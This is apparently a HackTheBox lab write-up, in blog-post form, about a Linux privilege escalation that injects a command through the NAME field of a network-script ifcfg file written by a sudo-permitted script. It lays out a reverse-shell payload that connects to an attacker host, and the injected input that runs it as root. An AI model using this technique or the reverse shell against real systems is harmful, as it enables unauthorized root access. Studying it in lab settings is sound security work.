---
layout: post
title: Network Scripts Command Injection
description: Network Scripts Command Injection
summary: Network Scripts Command Injection
tags: [linux,privesc,networking]
minute: 1
---
## Overview
Attacker can do privesc if user has sudo permissions to create or modify `ifcfg-<DEVICE_NAME>` under `/etc/sysconfig/network-scripts`

## Environment Setup and Requirements
* Sudo permissions

```
User guly may run the following commands on networked:
    (root) NOPASSWD: /usr/local/sbin/changename.sh
```

* Script content

```bash
#!/bin/bash -p
cat > /etc/sysconfig/network-scripts/ifcfg-guly << EoF
DEVICE=guly0
ONBOOT=no
NM_CONTROLLED=no
EoF

regexp="^[a-zA-Z0-9_\ /-]+$"

for var in NAME PROXY_METHOD BROWSER_ONLY BOOTPROTO; do
	echo "interface $var:"
	read x
	while [[ ! $x =~ $regexp ]]; do
		echo "wrong input, try again"
		echo "interface $var:"
		read x
	done
	echo $var=$x >> /etc/sysconfig/network-scripts/ifcfg-guly
done
  
/sbin/ifup guly0
```

## Steps
* Create your malicuous script

```bash
echo 'bash -i >& /dev/tcp/10.10.14.51/4444 0>&1' > /home/guly/evil
```

* Open netcat listener on attacker machine
* Run script using sudo and enjoy

```bash
[guly@networked ~]$ sudo /usr/local/sbin/changename.sh
interface NAME:
guly0 /home/guly/evil
[...redacted...]
```

## References
* [Linux Privilege Escalation - HackTricks](https://book.hacktricks.xyz/linux-unix/privilege-escalation#etc-sysconfig-network-scripts-centos-redhat)
* [HackTheBox - Networked](https://www.youtube.com/watch?v=H3t3G70bakM)
